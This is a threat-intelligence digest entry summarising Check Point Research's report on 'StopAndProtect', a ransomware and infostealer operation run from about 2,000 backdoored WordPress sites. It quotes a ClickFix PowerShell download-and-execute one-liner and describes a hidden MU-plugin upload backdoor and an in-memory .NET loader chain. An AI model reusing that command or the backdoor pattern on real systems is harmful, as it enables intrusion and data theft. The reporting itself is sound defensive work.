  - title: "StopAndProtect: Check Point unmasks a ClickFix-delivered ransomware/infostealer toolkit run entirely off ~2,000 backdoored WordPress sites via a hidden MU-plugin REST endpoint"
    sources:
      - { url: "https://research.checkpoint.com/2026/thousands-of-hacked-wordpress-sites-one-operation-unmasking-stopandprotect/", publisher: "Check Point Research", date: "2026-08-18", role: "primary" }
      - { url: "https://blog.checkpoint.com/research/the-mistake-that-exposed-a-global-cyber-crime-operation", publisher: "Check Point Blog (corporate)", date: "2026-08-18", role: "corroborating-same-publisher" }
    discovery_trace: "first seen at: prior triage hand-off (already cleared for publication) → re-fetched primary: Check Point Research, URL https://research.checkpoint.com/2026/thousands-of-hacked-wordpress-sites-one-operation-unmasking-stopandprotect/ (published 2026-08-18T13:05:44Z, author pedrod@checkpoint.com, confirmed via the page's own JSON-LD Article schema) → checked for independent second read: WebSearch (\"StopAndProtect WordPress Check Point ransomware\") and WebSearch (\"StopAndProtect ClickFix WordPress ransomware operation\") surfaced only (a) Check Point's OWN corporate-blog rewrite at blog.checkpoint.com (same publisher — confirmed via WebFetch as 'a marketing-oriented rewrite... explicitly links to the full technical analysis'), (b) cybersecuritynews.com (a rewrite outlet; could not fetch the body — jina pool exhausted and the direct GET returned an empty HTTP 202 shell) and (c) malware.news (a mechanical RSS mirror, not independent analysis). No editorially independent outlet that read and analyzed the underlying research was found as of this run."
    summary: |
      Check Point Research published a technical unmasking of "StopAndProtect" on 2026-08-18: a criminal toolkit operation that runs entirely off compromised WordPress sites rather than dedicated C2 infrastructure. First noticed mid-May 2026, the name originally applied only to the ransomware component but was extended to the whole operation because ransomware is not deployed against every victim — many are only silently data-mined. Infection starts with a fake-CAPTCHA ClickFix page on a hacked WordPress site that logs the visitor's IP and copies a PowerShell one-liner (`powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('<url>'))`) to the clipboard for the victim to paste and run. That PowerShell stage 1 reports telemetry to the base C&C and pulls PowerShell stage 2, which downloads a base64-encoded .NET assembly (stage 1), decodes and loads it into memory, then reflectively enumerates the assembly's types for a static, zero-parameter method named `Execute` and invokes it — a generic in-memory loader pattern repeated at .NET stage 2 (a persistent downloader/loader with sandbox checks) and stage 3, which unpacks the final component set: SilentEncryptor (ransomware — pulls an operator-supplied command file from the base C&C dictating which hostnames to encrypt, derives a 32-byte per-file key from a password+machine-name pair embedded in the renamed encrypted filename), NetworkShareScanner (SMB/USB worm enumerating shares and removable media), a VBS spreader (propagates to fixed/removable media and moves laterally via WMI remote process creation), LockScreen (blocks input, displays the ransom note and payment QR), SilentDataCollector (file-list generation, keylogging, WhatsApp-contact exfiltration via UI automation, and 30-second interval screenshotting while the victim is active), and SimpleChatProxy (a bespoke victim-operator chat channel). All observations above are Check Point's own direct technical findings (hashes, screenshots, and dual-perspective chat captures provided for each), not inferred. Persistence and remote file access on the compromised WordPress estate runs through a custom installer (`mu-uploader-installer.php`) that drops a must-use plugin at `wp-content/mu-plugins/wp-sec.php` — MU plugins auto-load on every request and do not appear in the standard Plugins UI — which registers a hidden REST route (`wp-sec/v1/upload`) authenticated by hardcoded credentials; anyone holding those credentials can POST to upload a file to almost any path under the WordPress root, explicitly including `.php`, before the installer deactivates and self-deletes itself to reduce visibility. Check Point's own opsec-failure discovery (the threat actor appears to have infected their own machine) yielded the operator's Visual Basic 6 fleet-management tool (`fMain.frm`), which drives the same compromised sites' secure-upload/secure-delete PHP scripts to mass-toggle the fake-CAPTCHA ClickFix lure and caching per site; an exposed open directory from that self-infection listed close to 2,000 compromised WordPress domains across several tracking text files, plus roughly 700 stolen-data archives and about 31,000 victim screenshots collected between mid-May and end-July 2026 from a separate open directory. Log analysis (self-described as limited/partial — some entries are sandbox/researcher noise, and one server's ClickFix log had been reset multiple times) puts total unique victim IPs above 6,000 as of 24 July 2026, concentrated in the US (1,852), Russia (630) and India (630); ClickFix-hit statistics from a single base C&C server show close to 600 unique IPs (US 111, India 110, Ukraine 29). On initial WordPress compromise, Check Point does NOT state a specific vector (no CVE, no credential-stuffing claim) — it only observes generically that "many vulnerable WordPress websites simply because their owners do not keep them updated," illustrated by one scanned victim site running a five-year-old WordPress core with roughly 40 identifiable issues (expired certs, SQLi, open redirects, auth bypasses, authenticated arbitrary file upload). Check Point names no ransomware-family lineage, no actor/group name, and no overlap with any previously tracked operation; StopAndProtect is presented as a newly identified, self-contained criminal toolkit. Defender guidance in the report is limited to a single boilerplate line that Check Point's own Threat Emulation and Harmony Endpoint "provide comprehensive coverage" — there is no telemetry-class or detection-logic guidance beyond that; the report's IOC section lists indicator counts only (5 compromised sites, 5 base C&C sites, 23 hashes, 1 YARA rule) without further defender methodology. No editorially independent second publisher analyzing the underlying research was found — the only other hit tracing to this story is Check Point's own corporate-blog rewrite of the same research.
    region_nexus: "global; technique (outdated public-facing WordPress exploited as disposable attack infrastructure) is directly transferable to any organization's own outdated WordPress estate, including Swiss/EU public-sector and SME sites"
